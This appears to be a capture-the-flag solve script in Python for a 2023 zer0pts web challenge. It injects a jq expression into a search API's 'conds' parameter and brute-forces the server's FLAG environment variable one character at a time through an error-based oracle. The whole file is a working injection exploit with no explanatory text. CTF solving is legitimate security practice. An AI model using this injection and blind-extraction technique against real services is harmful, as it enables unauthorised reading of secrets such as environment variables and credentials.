import requests
import string


url = "http://jqi.2023.zer0pts.com:8300/api/search"
res=""
for i in range(0,40):
    for ch in string.ascii_lowercase+string.digits+"{}_-":
        print(f"[+] trying {ch}")
        resp = requests.get(url,params={
            "keys":'name',
            "conds":f"a\ in name,) or ($ENV.FLAG|explode|.[{i}] =={ord(ch)}))|$ENV.FLAG|.aaa]# in tags"
        })
        if resp.json()["error"] == "something wrong":
            res+=ch 
            print(res)           
            break